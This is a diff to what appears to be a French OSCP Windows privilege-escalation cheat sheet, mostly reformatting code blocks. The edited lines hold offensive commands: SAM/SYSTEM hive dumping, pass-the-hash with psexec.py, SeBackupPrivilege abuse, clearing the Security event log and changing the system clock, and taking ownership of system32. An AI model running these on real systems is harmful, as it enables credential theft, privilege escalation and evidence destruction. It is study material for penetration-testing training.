@@ -456,10 +456,7 @@ HKLM\SAM
 ```
 
 
-```text
-HKLM\SYSTEM
-
-```
+<p class="oscp-inline-ref"><strong>Chemin ou clé Windows :</strong> <code>HKLM\SYSTEM</code></p>
 
 
 **Paramètres et repères :**
@@ -481,15 +478,14 @@ HKLM\SAM
 ```
 
 
-```text
-HKLM\SYSTEM
-
-```
+<p class="oscp-inline-ref"><strong>Chemin ou clé Windows :</strong> <code>HKLM\SYSTEM</code></p>
 
 
 
 
-```text
+<p class="oscp-command-note">Commande Windows : cmd</p>
+
+```powershell
 cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
 
 ```
@@ -522,7 +518,9 @@ psexec.py -hashes ":<ADMINISTRATOR_NTLM>" <Administrator>@<TARGET_IP>
 
 
 
-```text
+<p class="oscp-command-note">Commande Windows : robocopy</p>
+
+```powershell
 robocopy /b
 
 ```
@@ -530,10 +528,7 @@ robocopy /b
 
 
 
-```text
-User Account Control
-
-```
+<p class="oscp-inline-ref"><strong>Élément de sécurité Windows :</strong> <code>User Account Control</code></p>
 
 
 **Paramètres et repères :**
@@ -543,18 +538,12 @@ User Account Control
 
 
 
-```text
-Restricted Admin
-
-```
+<p class="oscp-inline-ref"><strong>Élément de sécurité Windows :</strong> <code>Restricted Admin</code></p>
 
 
 
 
-```text
-%WINDIR%\MEMORY.DMP
-
-```
+<p class="oscp-inline-ref"><strong>Chemin ou clé Windows :</strong> <code>%WINDIR%\MEMORY.DMP</code></p>
 
 
 **Paramètres et repères :**
@@ -563,10 +552,7 @@ Restricted Admin
 
 
 
-```text
-Backup Operators
-
-```
+<p class="oscp-inline-ref"><strong>Élément de sécurité Windows :</strong> <code>Backup Operators</code></p>
 
 
 **Paramètres et repères :**
@@ -593,7 +579,9 @@ Import-Module .\SeBackupPrivilegeCmdLets.dll
 
 
 
-```text
+<p class="oscp-command-note">Commande Windows : Copy-FileSeBackupPrivilege</p>
+
+```powershell
 Copy-FileSeBackupPrivilege <SOURCE_FILE> <DEST_FILE>
 
 ```
@@ -808,7 +796,9 @@ wevtutil cl Security
 ```
 
 
-```text
+<p class="oscp-command-note">Commande Windows : wevtutil</p>
+
+```powershell
 wevtutil sl Security /ms:0
 
 ```
@@ -865,7 +855,9 @@ cmd.exe /c date 01-01-01
 ```
 
 
-```text
+<p class="oscp-command-note">Commande Windows : cmd.exe</p>
+
+```powershell
 cmd.exe /c time 00:00
 
 ```
@@ -892,7 +884,9 @@ takeown.exe /f "%windir%\system32"
 
 
 
-```text
+<p class="oscp-command-note">Commande Windows : icacls.exe</p>
+
+```powershell
 icacls.exe "%windir%\system32" /grant "%username%":F
 
 ```
@@ -1046,7 +1040,9 @@ Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object
 
 
 
-```text
+<p class="oscp-command-note">Extrait de code C</p>
+
+```c
 #include <stdlib.h>
 
 int main ()
@@ -1265,7 +1261,9 @@ $env:path
 
 
 
-```text
+<p class="oscp-command-note">Extrait de code C</p>
+
+```c
 #include <windows.h>
 
 BOOL APIENTRY DllMain(
@@ -2230,10 +2228,7 @@ whoami /priv
 
 
 
-```text
-NT AUTHORITY\SYSTEM
-
-```
+<p class="oscp-inline-ref"><strong>Compte système Windows :</strong> <code>NT AUTHORITY\SYSTEM</code></p>
 
 
 **Paramètres et repères :**
@@ -2796,10 +2791,7 @@ rdesktop [ip]
 
 
 
-```text
-nt authority\system
-
-```
+<p class="oscp-inline-ref"><strong>Compte système Windows :</strong> <code>nt authority\system</code></p>
 
 
 
